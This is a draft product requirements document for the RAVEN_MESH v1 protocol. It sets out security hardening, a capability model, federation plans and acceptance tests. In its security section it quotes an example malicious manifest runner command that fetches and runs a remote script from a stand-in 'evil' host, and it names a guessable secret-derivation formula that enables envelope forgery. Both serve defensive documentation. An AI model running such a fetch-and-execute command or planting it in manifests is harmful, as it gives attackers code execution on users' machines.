---
title: RAVEN_MESH v1 — Product Requirements Doc (draft)
author: v1 PRD draft worker
date: 2026-05-10
status: DRAFT — synthesised from wave-1 outputs (synthesis, inspiration, security
  audit, manifest validator, SSE consolidation, capability graph, four prototype
  cores, NATS pivot, agent process model, multi-host federation, tool discovery)
constraint: PROTOCOL_CONSTRAINT.md — every recommendation tagged
  protocol-layer | opinionated-layer
---

# 1. Vision

RAVEN_MESH at v1 is an **unopinionated mesh protocol** plus a **reference
opinionated stack** — and the two ship in the same repo without sharing a
trust boundary or an API surface.

Concretely, v1 splits the codebase into two halves that obey the
[PROTOCOL_CONSTRAINT](./PROTOCOL_CONSTRAINT.md):

- **The protocol layer** is a small, language-agnostic envelope routing
  contract. It defines: HMAC-signed envelopes with replay protection, a
  manifest schema, an allow-edge ACL, JSON-Schema-typed surfaces, and a
  bounded SSE delivery channel. It says nothing about what runs on top.
  The conformance contract is a single test suite that any
  implementation — Python, Elixir, Go, Rust, NATS-backed — passes or
  fails. (Python today; Elixir or NATS later if a trigger event fires.)
- **The opinionated layer** is everything that encodes a product
  decision: today's dashboard, the kanban node, the voice actor, the
  nexus agents, the specific manifests we ship as demos, and the
  human-operator UX. None of it is privileged. It speaks the same
  protocol every third-party node would speak.

The single test that decides whether we shipped v1 right is the **fork
test**: someone clones the repo, deletes `dashboard/` and every node
under `nodes/`, writes a different product on top of `core/` plus
`node_sdk/`, and the protocol layer feels right for their use case. If
that fails, we leaked product opinion into the protocol and v1 is not
done.

This is an explicit promotion of the existing v0.4 thesis ("the shape of
the protocol matters, implementation doesn't") into a load-bearing
constraint on what the v1 protocol surface is *allowed* to know about.

# 2. Hard requirements

These are non-negotiable for v1. The numbering inherits from the
security audit (V-NN) and synthesis worker output where applicable.
Every item is tagged `[PROTOCOL]` or `[OPINIONATED]`.

## Protocol-layer requirements

- **HR-1 [PROTOCOL]** — every envelope carries a fresh `nonce` and an
  ISO-8601 `timestamp`; Core rejects envelopes outside ±60s of server
  clock and rejects duplicate `id`s seen within the last 1024 envelopes
  per source node. *Source: V-03.* Closes the same-host packet-replay
  attack and survives the eventual Elixir port unchanged.
- **HR-2 [PROTOCOL]** — Core refuses to start with the default
  `ADMIN_TOKEN` ("admin-dev-token") and rejects `?admin_token=`
  query-string auth on every `/v0/admin/*` route; only the
  `X-Admin-Token` header is honoured. *Source: V-01, V-18.*
- **HR-3 [PROTOCOL]** — node `identity_secret` derivation never falls
  back to a public formula. Every node either resolves `env:VAR`
  loudly-or-fails or pulls from a per-machine 32-byte master in
  `~/.config/raven_mesh/secret_master` (mode 0600, generated on first
  boot). *Source: V-08.*
- **HR-4 [PROTOCOL]** — per-node SSE delivery queues are bounded
  (`maxsize=1024`); on overflow Core returns 503 + writes a
  `denied_queue_full` audit entry; repeated overflow evicts the
  consumer. *Source: V-06.*
- **HR-5 [PROTOCOL]** — SSE supports `Last-Event-ID` resume. Core
  retains a bounded ring buffer (last N envelopes per node) and replays
  events the client missed. The SDK passes the header on reconnect.
  *Source: synthesis §4, sse_consolidation, MCP § transports.*
- **HR-6 [PROTOCOL]** — manifest validator runs on every load and
  every admin manifest write. Strict mode is the default in v1 (Stage 2
  of `manifest_validation_design.md`). Errors block the load and roll
  back; warnings are surfaced in the admin response and dashboard.
- **HR-7 [PROTOCOL]** — schema paths in the manifest must resolve
  inside `manifest_dir` (or a sibling `schemas/` directory). Path
  traversal returns a validation error, not a file read. *Source:
  V-13.*
- **HR-8 [PROTOCOL]** — the manifest is the *only* runtime authority
  source. No `metadata.runner.cmd` shell-execution path unless an
  explicit `MESH_ALLOW_INLINE_RUNNERS=1` env is set. The reference
  supervisor only runs `scripts/run_<node_id>.sh` resolvers by default.
  *Source: V-01.*
- **HR-9 [PROTOCOL]** — `_capabilities` is a system surface every
  node implicitly exposes (synthesised by Core at manifest load,
  authorised by an implicit `(*, *._capabilities)` edge). It returns
  the node's outgoing edges + the schemas they target. *Source:
  capability_graph/MODEL.md §5.4, A2A's agent-card pattern.*
- **HR-10 [PROTOCOL]** — payload-shape *caveats* on edges (JSON-Schema
  fragments merged into the surface schema at routing time). This is
  the smallest first step of the chained-HMAC capability extension and
  closes weakness 5 in the capability graph (per-payload granularity).
  *Source: capability_graph/MODEL.md §5.2; deliberately excludes
  delegation (§5.1) which slips to v1.1.*
- **HR-11 [PROTOCOL]** — Core records an `admin_synthesized: true`
  meta on any envelope created by `/v0/admin/invoke`, and audit/tap
  events render that flag. Spoofed envelopes are visibly distinct from
  organic ones. *Source: V-04.*
- **HR-12 [PROTOCOL]** — supervisor exposes four restart strategies:
  `permanent | transient | temporary | on_demand`. The `on_demand`
  strategy spawns on first envelope, idle-reaps after
  `idle_shutdown_s`. The strategy is a protocol-level enum the manifest
  selects per-node; the *choice* of strategy per node is opinionated
  configuration. *Source: agent_process_model/ANALYSIS.md.*
- **HR-13 [PROTOCOL]** — Origin allowlist on every `/v0/admin/*`
  POST: requests with no `Origin` header (curl) are accepted; requests
  with an `Origin` header must match `ALLOWED_ORIGINS` (default empty;
  the dashboard origin is the only entry the reference stack adds).
  *Source: V-01, V-14.*
- **HR-14 [PROTOCOL]** — every protocol-level conformance is
  expressed as an executable test in `tests/test_protocol.py`. The
  external-language node test (`test_step_10_external_language_node`)
  is promoted to a top-level demo with a Go and a Rust port (one each
  is sufficient). *Source: synthesis §4, elixir prototype §4.5.*

## Opinionated-layer requirements

- **HR-15 [OPINIONATED]** — `dashboard_node` is a real mesh node, not
  a privileged client. It registers with HMAC, holds outgoing edges to
  the surfaces it drives, and subscribes to a `core.audit_stream`
  surface for live logs instead of `/v0/admin/stream`. The
  `/v0/admin/*` endpoint family shrinks to `manifest`, `reload`, and
  `state` (read-only); `invoke` and `node_status`/`ui_state` go away
  because the dashboard reaches them through the normal protocol
  path. *Source: synthesis §6 — the bold proposal.*
- **HR-16 [OPINIONATED]** — `--dangerously-skip-permissions` in
  `nexus_agent.cli_runner` and `nexus_agent_isolated.docker_runner` is
  gated behind `MESH_ALLOW_DANGEROUS=1`. Both nodes have a regression
  test that asserts the args list contains `--tools ""`. *Source: V-07.*
- **HR-17 [OPINIONATED]** — `voice_actor` uses OpenAI ephemeral
  session tokens (`POST /v1/realtime/sessions` → short-lived token →
  WebSocket); the long-lived `OPENAI_API_KEY` lives in the voice_actor
  process for the duration of one HTTP call per session. Concurrent
  `start_session` is capped at 1; new sessions refuse for 5s after
  `stop_session`. *Source: V-09.*
- **HR-18 [OPINIONATED]** — `nexus_agent_isolated`'s control server
  binds to `127.0.0.1` (not `0.0.0.0`); the docker bridge reaches it
  via a `--add-host` mapping or unix-domain socket. *Source: V-10.*
- **HR-19 [OPINIONATED]** — `kanban_node` and any other node serving
  a web API gates mutating routes behind an Origin allowlist or a CSRF
  token. *Source: V-17.*

# 3. Architecture decision

## What we have measured

| Stack | Core LOC (parity slice) | Idle RSS | Cold start | Single binary |
|---|---:|---:|---:|---|
| Python (today, `core/core.py`) | **875** | ~47 MB | 150 ms | no (interpreter + deps) |
| Elixir (`experiments/elixir_mesh`) | **730** (10 files) | ~70 MB | seconds | no (BEAM + ERTS) |
| Rust (`experiments/rust_mesh`) | **~1361** | **8.4 MB** | **23 ms** | **5.9 MB** |
| Go (`experiments/go_mesh`) | 1215 | 14.6 MB | <10 ms | **6.7 MB** stripped |
| NATS-backed (`experiments/nats_pivot`) | **511** (Python SDK + config compiler) | n/a (broker is Go) | n/a | no (two daemons) |

Everything passes a behaviour-equivalent subset of `tests/test_protocol.py`.
The performance numbers (`bench.py`): NATS p50 0.586 ms, mesh-direct p50
0.674 ms — sub-millisecond on loopback in both cases. The interesting
deltas are operational, not perf.

## What changes vs. what stays

The decision splits cleanly along the constraint:

**Affects only the opinionated layer (free to choose, can change later
without breaking external nodes):**
- Process model of the reference Core (Python aiohttp today, Elixir
  later, Go/Rust if a deploy-footprint constraint forces it).
- Supervisor implementation (Python is fine; OTP gives crash recovery
  for free per the Elixir prototype, but it's not a protocol concern).
- Dashboard implementation (Vite/React today, LiveView later if Elixir
  ports the Core).

**Affects the protocol layer (cannot be changed without a v2 break):**
- Wire format: HMAC over canonical JSON, JSON envelopes, SSE delivery,
  the seven `/v0/*` endpoints. **This must not move.**
- Manifest schema. The Elixir, Go, Rust, and NATS prototypes all parse
  the same YAML; that portability is the moat.
- Conformance test suite. Whatever language the Core is written in,
  it must pass `tests/test_protocol.py` (or its Elixir/Go/Rust mirror).

## Recommendation for v1

**Stay Python for the v1 Core. Do not pivot stacks.** Reasoning, citing
specific prototype numbers:

1. **The Elixir port is real but not yet load-bearing.** 730 LOC at
   parity is a 17% saving over Python, *less* than the synthesis
   worker's "is this premature optimisation?" threshold. The wins
   (supervisor, mailbox, replay) are language-natural in BEAM but
   cost ~1 weekend to port and are not currently bottlenecks. The
   Elixir worker's own recommendation: *"Don't rewrite now. But keep
   the prototype."* I agree.

2. **Rust and Go's wins are deployment, not architecture.** 5.9 MB
   single binary, 8.4 MB RSS, 23 ms cold start — these compound only
   if RAVEN_MESH ships to small edge boxes or per-invocation cold
   spawn. Neither is a v1 use case. If `dashboard_node` ever needs to
   ship as a downloadable artifact, Rust becomes interesting. Today,
   Python is fine.

3. **NATS is a transport, not a mesh.** The 511-LOC NATS SDK + config
   compiler is genuinely smaller, and JetStream gives durable replay
   for free. But it deletes the centralised schema-validation
   property: every responder validates instead of Core. The honest
   comparison is *not* 1164 LOC vs 511 LOC; it's "1164 LOC of mesh"
   vs "511 LOC of mesh-on-NATS *plus* nats-server *plus* the
   regenerated nats.conf *plus* the same manifest *plus* the same
   schemas." The NATS pivot worker's verdict — *adopt as the
   transport under the SDK when federating, keep the manifest as the
   source of truth* — is the right framing. v1 doesn't federate, so
   v1 doesn't pivot.

4. **The Elixir port becomes the v1.x rewrite trigger.** Three
   things, whichever happens first: (a) ≥10 long-running nodes with
   hand-rolled supervision in three or more places; (b) a real
   fault-tolerance incident requiring manual recovery, twice in 30
   days; (c) the federation feature lands and Erlang clustering is
   the natural substrate. None of those are true today.

5. **The conformance test is the rewrite insurance policy.** As long
   as the Elixir/Go/Rust prototypes keep passing
   `tests/test_protocol.py`, the rewrite stays a one-weekend project,
   not a strategic risk.

**Therefore v1 ships Python.** The hardenings (HR-1..HR-14) all apply
to Python; they all port to Elixir/Go/Rust unchanged because they
are protocol-layer concerns, not implementation choices.

## Tagged consequences

| Decision | Layer affected |
|---|---|
| Python aiohttp Core | opinionated (the *implementation* of the protocol, not the protocol itself) |
| HMAC-SHA256 + canonical JSON envelope | protocol |
| `core/supervisor.py` Python implementation | opinionated |
| Four restart strategies as a protocol enum | protocol |
| The dashboard is a Vite/React app | opinionated |
| The dashboard authenticates via HMAC like every other node | protocol (it's the rule everyone obeys) |
| The current `manifests/full_demo.yaml` content | opinionated (one specific deployment) |
| Manifest *schema* (`schemas/manifest.json`) | protocol |

# 4. Capability model

This is **all protocol-layer**. v1 inherits the formal model from
`capability_graph/MODEL.md` and ships two of its four extensions.

## What's in v1

- **Allow-edges as today.** Datalog `allow_edge(From, B, S)` remains
  the primary `can_invoke/1` clause. Edge-as-grant is the load-bearing
  invariant; v1 does not relax it.
- **Caveats (extension §5.2).** A relationship may carry a
  `caveats:` block — JSON-Schema fragments merged with the surface's
  schema at routing time. The verifier validates the payload against
  the merge. Closes weakness 5 (per-payload granularity) at zero
  crypto cost. Backwards compatible: edges without `caveats` behave
  exactly as today.
- **Time bounds (extension §5.3).** Optional `expires_at` and
  `valid_for_seconds` per edge. Verifier rejects expired envelopes
  with `denied_expired`. Closes weakness 3.
- **`_capabilities` introspection surface (extension §5.4).** Every
  node automatically exposes `_capabilities`, returning its outgoing
  edges (with their caveats and expiries) and incoming sources. This
  is the equivalent of A2A's `/.well-known/agent-card.json` scoped to
  authority, and answers the question voice_actor's
  `_build_mesh_tools` already answers via `/v0/admin/state` (synthesis
  §2). With this surface, voice_actor's pattern stops needing the
  admin token.

## What's out of v1 (slated for v1.x)

- **Delegation (extension §5.1).** Chained HMAC envelopes carrying
  delegation caveats let a holder mint a sub-cap. The synthesis worker
  identified this as the biggest blind spot in current design. It's
  the right thing to build *next*, but it requires deciding the
  recipient identity story first (HMAC fingerprint vs Ed25519 pubkey)
  and that decision is entangled with the federation story (§5).
  Shipping the simpler caveat extension first lets us exercise the
  vocabulary; delegation rides on top of it.
- **Three-party handoff certificates (OCapN-style).** Same gating as
  delegation.
- **Macaroon-style third-party caveats.** Same gating.

## Why this combination, this order

The capability_graph worker's argument (§6) that *the smallest
worthwhile first step is caveats without delegation* matches the v1
constraint of "ship the protocol-shape changes that don't introduce a
new cryptographic primitive." Caveats reuse the existing
JSON-Schema-validation path. Time bounds add ~10 lines to the verifier.
Introspection makes the manifest visible to runtime callers — which
voice_actor and the tool_discovery composer agent both already need.
Delegation is where new crypto enters; it deserves its own milestone.

# 5. Federation story

**v1 is single-host. Multi-host federation is reserved but not
shipped.** This is a protocol-layer decision because the federation
contract changes the wire envelope.

## What the prototype proved (`experiments/multi_host`)

The 500-LOC peer-link shim demonstrates that:

1. Two Cores can federate over `/v0/peer/envelope` with a shared
   per-pair HMAC, with replay defence (10-min nonce cache + ±5min
   timestamp window).
2. Manifests can declare `peer_cores` and `remote_nodes` without
   touching Core source — `additionalProperties: true` on every level
   means today's manifest schema already accepts the extension.
3. The SDK does not change: `node.invoke("beta.ping", payload)` works
   identically whether `beta` is local or remote.

The trust model (peer-pair HMAC) is acceptable for the prototype but
**not shippable for v1** because:
- Shared-secret rotation across hosts is a coordination problem the
  current SDK does not handle.
- Compromised Core A can forge any inner envelope from any of A's
  nodes (attack A in §5 of FEDERATION.md). This is intrinsic to
  shared-secret peer trust; only asymmetric keys (Ed25519) close it.

## What v1 commits to

- **Reserve the manifest keys** (`local_core_name`, `peer_cores`,
  `remote_nodes`) in the v1 manifest schema as `additionalProperties`
  pass-throughs. Nothing reads them yet; they don't fail validation.
  *This locks the namespace so v1.x federation doesn't need a
  manifest-schema break.*
- **Document the v1 trust boundary explicitly:** Core hosts a single
  user's nodes on a single host. HMAC-shared-secret per node is fine
  inside that boundary; nothing else.
- **Do not ship `/v0/peer/envelope`.** The endpoint stays in
  experiments/ until v1.x.

## v1.x federation triggers

Federation graduates from experiment to v1.x feature when *all three*
of:
1. Identity migrates to per-node Ed25519 keypairs (subsumes
   chained-HMAC-delegation work, §4).
2. Core exposes a `peer_pubkey` at a well-known endpoint
   (`/v0/peer/info`) that other Cores can pull.
3. The Tailscale or TLS transport story is documented (the peer-link
   HMAC is application-layer auth, not transport security).

This is one cohesive piece of work, not three. The Elixir port is the
right substrate for it, because Erlang clustering already solves the
cross-host process-supervision problem federation re-introduces.

# 6. Process model

The protocol exposes **four restart strategies**: `permanent`,
`transient`, `temporary`, `on_demand`. The protocol does not encode
*which* strategy a given node uses; that is opinionated configuration
in the manifest's per-node `runtime` block.

This separation matters. The supervisor framework — *what strategies
exist, what semantics they have, what the lifecycle protocol with the
manifest is* — is protocol-layer because every alternative Core
implementation (Elixir's DynamicSupervisor, Go's bespoke restart loop,
Rust's tokio monitor) has to honour the same enum. But the per-node
selection — *kanban gets `permanent`, weather lookup gets `on_demand`*
— is product opinion: a different deployment might run a stateless
mesh of pure tools where everything is `on_demand`.

## What `on_demand` adds

Per the agent_process_model worker (§5–§6):

- **Spawn-on-first-envelope, idle-reap-after-N-seconds.** Default
  `idle_shutdown_s = 30`. The supervisor exposes
  `ensure_running(node_id, manifest_node)` — the dispatcher calls it
  before routing, so the next envelope wakes a stopped child.
- **Two shapes:** (a) per-envelope cold-spawn, (b) warm-for-N-seconds
  via stdin-pipe reuse. v1 ships shape (b) because the 40 ms cold
  floor matters; (a) is `idle_shutdown_s = 0` for callers who want it.

## Performance reality check

The benchmark (`agent_process_model/benchmark.py`):
- Cold-spawn p50: **40.68 ms** (vs daemon 0.040 ms — ~1000× slower).
- Cold-spawn idle RAM: **0 KB** (vs daemon ~25 MB held forever).

The trade-off is RAM-vs-latency. For pure tools (echo, weather,
JSON validators), cold-spawn is correct. For session-bearing nodes
(voice_actor, nexus_agent, approval_node), it's wrong — the
agent_process_model worker classified 5 of 11 current nodes as strict
daemons. That classification lives in the *opinionated* manifest, not
in the protocol.

## What the protocol commits to

- The four-strategy enum is part of the manifest schema.
- The supervisor's contract with the manifest is structured: a
  manifest reload returns a structured diff (`added`, `removed`,
  `runtime_changed`) so the supervisor can act surgically. *Source:
  synthesis §5 question 2.*
- The supervisor's API is exposed through Core's
  `core.lifecycle` self-surfaces (`start_node`, `stop_node`,
  `restart_node`), gated like every other surface. The dashboard's
  "spawn this node" button calls those surfaces over the wire, not a
  privileged admin endpoint. This is the synthesis worker's bold
  proposal (§6) made concrete for the supervisor case.

# 7. Security hardening — top 3 from the audit

Picked by (attack-surface closed) ÷ (effort to ship), per the audit's
own ranking. All three are protocol-layer.

## Hardening 1 — Lock down the admin trust root (V-01 + V-02 + V-18)

The single highest-leverage fix. Today, a malicious tab in the user's
browser can POST a manifest with a `metadata.runner.cmd:
"curl evil/x.sh | bash"`, then trigger spawn, and get RCE as the Core
user — because the default token is "admin-dev-token", the Vite proxy
unconditionally injects it, and same-host browser POSTs are
indistinguishable from curl POSTs. ~30 lines of code closes it:

- Refuse to start if `ADMIN_TOKEN` is unset or equals the default.
- Drop `?admin_token=` query-string auth (V-18).
- Refuse `metadata.runner.cmd` unless `MESH_ALLOW_INLINE_RUNNERS=1`
  is set.
- Refuse inline `identity_secret` on remote manifest writes (V-02).
- Origin allowlist on every `/v0/admin/*` POST (HR-13).
- Vite proxy refuses to start with default token.

This is HR-2 + HR-8 + HR-13 from §2 in one ship.

## Hardening 2 — Replace the public secret-derivation formula (V-08)

`sha256("mesh:<node_id>:dev")` is a one-shell-line computation any
process on the same machine can run. Anyone with the source code can
sign envelopes as any node. The fix:

- Per-machine random 32-byte master in
  `~/.config/raven_mesh/secret_master`, mode 0600, generated on first
  boot.
- `_resolve_secret` HMAC's the node-id against the master.
- `env:VAR` resolution raises loudly when the env is missing — no
  silent fallback to `sha256("mesh:<node_id>:autogen")`.

~20 lines. After this, V-03's replay attack requires actual packet
capture instead of a `printf | sha256` one-liner. This is HR-3.

## Hardening 3 — Bound the SSE delivery queues (V-06)

`asyncio.Queue()` per registered node, unbounded. A slow consumer
fills it; an attacker registers, never reads, and Core's RSS grows
until OOM. The fix is `asyncio.Queue(maxsize=1024)` and
`QueueFull` → 503 + `denied_queue_full` audit entry. Repeated fills
evict the consumer. ~10 lines. This is HR-4.

The Elixir port gets HR-4 for free via `{:max_heap_size, N}` mailbox
limits, but v1 ships in Python and the bound is explicit. The
audit-log signal (`denied_queue_full`) is the dashboard's evidence
that back-pressure is happening.

## Why these three, in this order

V-01 is the only vulnerability that fires *today*, with no
sophisticated attacker, against a user who runs `npm run dev` and
visits a malicious page. V-08 makes V-03 hard. V-06 makes
single-process DoS impossible without a second exploit. Everything
after these — V-04, V-05, V-07, V-09 onward — is a tightening, not a
load-bearing fix.

# 8. Migration path — Python today → v1 stack

v1 is *additive harden-and-extend*, not a rewrite. The migration is
an ordered list of in-place changes against the `simplify-raven`
branch.

## Stage 0 — pin the protocol shape

Before changing implementation, lock the contract:
- Add a Go and a Rust equivalent of
  `tests/test_protocol.py::test_step_10_external_language_node` and
  wire them into CI. Drives the conformance test suite as the
  shape-of-truth.
- Add a canonical-JSON golden-vector test matched against the Elixir
  prototype's `crypto.ex` output (per Elixir worker §5).
- Promote `/v0/admin/*` endpoint contracts into PROTOCOL.md or
  remove them from Core (see Stage 4).

## Stage 1 — security hardening (the top 3)

Land the three fixes from §7 as one PR (V-01+02+18) and two follow-up
PRs (V-08, V-06). Run audit/penetration test against the result. None
of these break any external API.

## Stage 2 — manifest validator landed and made strict

Wire `core.manifest_validator.validate_manifest` into
`CoreState.load_manifest` per `manifest_validation_design.md`. Stage
1 (warnings-only) for one week; fix `manifests/full_demo.yaml` to
declare `nexus_agent`; flip strict on. The validator gives the
dashboard a structured way to render manifest errors, replacing the
current `{"error": "load_failed", "details": "..."}` blob.

## Stage 3 — capability extensions

In order: caveats (no new crypto), time bounds, `_capabilities`
surface. Each is a small additive change; existing manifests stay
valid.

## Stage 4 — dashboard-as-node refactor

The synthesis worker's bold proposal (§6) lands here, after the admin
endpoints have been pruned to a minimum. The dashboard registers as
`dashboard_node`, signs envelopes with HMAC, drives surfaces through
normal `mesh.invoke`, and subscribes to a `core.audit_stream`
self-surface for live logs. The admin token shrinks to a single
`core.set_manifest` permission. This collapses two protocols into
one and is the single biggest "is this protocol clean?" signal.

## Stage 5 — supervisor `on_demand` strategy

Land HR-12 — the fourth restart strategy plus its idle reaper —
along with the structured `reconcile()` diff response. Migrate
`dummy_actor`, `dummy_capability`, `dummy_approval`, `dummy_hybrid`
to `on_demand` as a real-world test of the strategy.

## Stage 6 — SSE consolidation finished and Last-Event-ID resume

Finish the SSE migration started in `notes/sse_consolidation.md`
(approval_node, webui_node, human_node, voice_actor,
nexus_agent_isolated). Add `Last-Event-ID` resume to Core's
`/v0/stream` (HR-5). The SDK uses it on reconnect.

## Stage 7 — opinionated-layer hardenings

V-07 (`--dangerously-skip-permissions` gated), V-09 (voice_actor
ephemeral keys), V-10 (`nexus_agent_isolated` control bind), V-17
(kanban_node Origin gate). These ship in any order; they don't gate
v1 protocol but they ship as part of the v1 reference stack.

## Stage 8 — release

Tag v1.0.0. PROTOCOL.md is the source of truth and matches what
Core exposes. The conformance test suite is green. The fork test
(§10) passes. The Elixir prototype still passes the conformance
suite. v1 done.

## What stays Python forever (v1.x and onward)

`voice_actor`, `nexus_agent`, `nexus_agent_isolated`, anything calling
into Anthropic/OpenAI HTTP APIs. The Python ML ecosystem is an
asymmetric advantage; the Elixir worker explicitly recommends not
porting these (PORTING_ANALYSIS.md §3, "don't rewrite voice_actor or
nexus_agent").

# 9. Out of scope for v1

Explicitly deferred. Each is shippable later without a v1 protocol
break.

- **Multi-host federation** (covered in §5). v1 reserves the
  namespace; v1.x ships the feature with Ed25519 identity.
- **Delegation envelopes / chained HMAC capabilities** (covered in
  §4). The biggest blind spot in current design per the inspiration
  scout, but slips to v1.x because it entangles with federation
  identity.
- **Multiple agent runtimes (Codex CLI, Aider, custom Python
  agents).** The MCP-bridge pattern (synthesis §2) ports to any of
  them, but `cli_runner.py` would need a strategy split. Out of v1
  reference stack; nothing in the protocol prevents anyone else from
  shipping this as a third-party node.
- **Per-edge rate limiting.** V-05 in the audit. Cheap to add, but
  none of the demo flows need it; defer until a real consumer asks.
- **Audit log rotation and integrity hash chain.** V-16 in the
  audit. Useful, not blocking.
- **Macaroon-style third-party caveats and OCapN-style three-party
  handoffs.** Both gated on delegation (which is gated on federation
  identity). v1.x or later.
- **Communal namespaces (Meadowcap-style).** Today's manifest is a
  single owned namespace. Multi-tenant or BYO-identity models slip to
  whenever federation does.
- **Replacing aiohttp+SSE with a different transport (NATS, libp2p,
  WebSocket-only).** Per §3, the NATS pivot is a v1.x consideration
  driven by a federation trigger, not v1 work.
- **A standalone single-binary Core distribution.** Go and Rust
  prototypes prove this is feasible; nothing forces it now.
- **Hot-swap Core (zero-downtime restart).** BEAM gives this for
  free; Python doesn't. v1.x with the Elixir port.
- **Schema-typed deletion / destructive-cap tools (Meadowcap's
  prefix-pruning).** Inspiration scout flagged these as a footgun for
  RAVEN. Permanently deferred unless a use case justifies the risk.

# 10. Acceptance tests — how do we know v1 is done

A v1 candidate ships when **every test below passes**. Each is
mechanically verifiable; the fork test is the only judgment call, and
it gets a written checklist.

## A1 — Conformance test suite

`pytest tests/` is green: 67 tests today, plus the new suites for
HR-1..HR-14. Specifically:
- HR-1: replay/timestamp/nonce defence has tests asserting (a) ±60s
  enforcement, (b) duplicate-id rejection within window, (c)
  fresh-nonce requirement on register.
- HR-4: bounded queues — synthetic slow consumer + fast producer
  asserts the 503 + audit entry, no OOM.
- HR-5: `Last-Event-ID` replay covered by an interrupt-and-reconnect
  test.
- HR-6: manifest validator strict mode rejects the
  `nexus_agent`-undeclared variant of `full_demo.yaml`.
- HR-12: `on_demand` strategy exercised — node not running until first
  envelope, reaped after idle window, woken again on next envelope.

## A2 — External-language conformance

A Go node and a Rust node, written without the Python SDK, complete a
register → invoke → respond round trip and pass schema validation.
Both live in `examples/`, run from `make conformance`, and are
exercised by CI. Neither uses any RAVEN-specific Python helper. Source:
elixir worker §4.5 ("the external_node demo is the real spec").

## A3 — Cross-language canonical JSON

A golden-vector test in `tests/test_canonical_json.py` ships a fixed
envelope and its expected canonical bytes; the same vector is
exercised in `experiments/elixir_mesh/test/crypto_test.exs`,
`experiments/rust_mesh/tests/integration.rs`, and
`experiments/go_mesh/internal/crypto`. All four produce byte-identical
output.

## A4 — Security regression tests

Every fixed CVE-class issue from `security_audit_20260510.md` has a
regression test that fails on the pre-fix code and passes after. At
minimum: V-01 (default token rejection), V-02 (inline secret rejection
on remote write), V-03 (replay), V-06 (queue bound), V-08 (no public
derivation), V-13 (path traversal), V-14 (CORS strictness).

## A5 — Capability extension tests

- Caveats: a relationship with a `payload.budget < 10` caveat
  rejects an envelope with budget 11; accepts budget 9.
- Time bounds: an `expires_at: <past>` edge rejects with
  `denied_expired`; in-window passes.
- `_capabilities` surface: every declared node responds, returning
  exactly the edges the manifest declares.

## A6 — Supervisor reconcile contract

`reconcile(manifest)` returns a structured diff `{"added": [...],
"removed": [...], "runtime_changed": [...]}`. Test: change a node's
restart strategy in the manifest, reload, assert the diff lists that
node under `runtime_changed` and the supervisor restarts it.

## A7 — Dashboard-as-node test

`dashboard_node` is in the demo manifest with explicit outgoing edges.
The dashboard's "send message to webui" feature works through the
normal mesh path, not `/v0/admin/invoke`. Audit log records the
envelope as `from: dashboard_node`, not `from: dashboard_synthetic`.
The admin token has zero outbound permissions other than
`core.set_manifest`.

## A8 — The fork test

The acceptance criterion that decides whether the protocol stayed
unopinionated. The test is a written exercise that the project owner
walks through before tagging v1.0.0:

1. Branch from `main`.
2. Delete `dashboard/`, every directory under `nodes/`, every file
   under `manifests/`, and every shell script under `scripts/`. Keep
   `core/`, `node_sdk/`, `schemas/`, `tests/`, and `docs/`.
3. Write a totally different product on top of what's left. Suggested
   exercise: a three-node mesh of (a) a feed-reader actor that polls
   a JSON URL on a timer, (b) a NLP-summariser capability that calls
   a local model, (c) an email-sender approval node that requires
   human confirmation. None of these resemble kanban + voice +
   agent.
4. **Pass criterion:** the protocol layer's API surface (manifest
   schema, surface kinds, supervisor strategies, capability
   extensions, audit format, SSE contract) feels right for the new
   product. Specifically:
   - No "this only makes sense if you have a kanban board" decision
     surfaces.
   - No "the dashboard expects this column" coupling.
   - No node SDK helper that bakes in agent-loop-shaped assumptions.
   - The new product's manifest passes validation without ad-hoc
     hacks.
   - Adding a new node type the original team didn't anticipate
     requires zero changes to `core/` or `node_sdk/`.

If any of those fail — if the only way to make the new product work
is to add a knob to Core, or to subclass a node SDK helper that
assumed a kanban-shaped use case — we leaked opinion into the
protocol and v1 is not done. Pull the offending coupling into the
opinionated layer; re-run the fork test; ship when it passes.

## A9 — Performance baseline

Loopback `bench.py`-equivalent: p50 invoke latency ≤ 1.0 ms, p95 ≤
2.0 ms, p99 ≤ 5.0 ms. The current Python core is well within these
bounds; the budget is set so that future protocol additions (HR-1
nonce checks, HR-10 caveat schema merge) cannot regress without
notice.

## A10 — Documentation

`docs/PROTOCOL.md` documents every field in the v1 envelope, the
manifest schema, the four restart strategies, the capability extensions
(caveats + time bounds + `_capabilities`), and the security model
(per-machine secret master, ±60s replay window, bounded queues).
Anyone reading PROTOCOL.md alone — without `core.py` open — can write
a conformant alternative Core. The Elixir, Go, and Rust prototypes are
the proof-of-portability.

---

## Closing — the v1 thesis in one sentence

> **v1 is the smallest set of protocol-layer commitments under which
> today's opinionated stack — dashboard, kanban, voice, agents — can
> be ripped out and replaced with a totally different product
> *without rewriting the protocol.***

If any opinionated-layer assumption seeps into Core, the admin
endpoints, or the SDK, we shipped a kanban-flavoured agent runtime
instead, and the fork test (A8) will fail. Ship when A1–A10 pass.

— v1 PRD draft worker, 2026-05-10
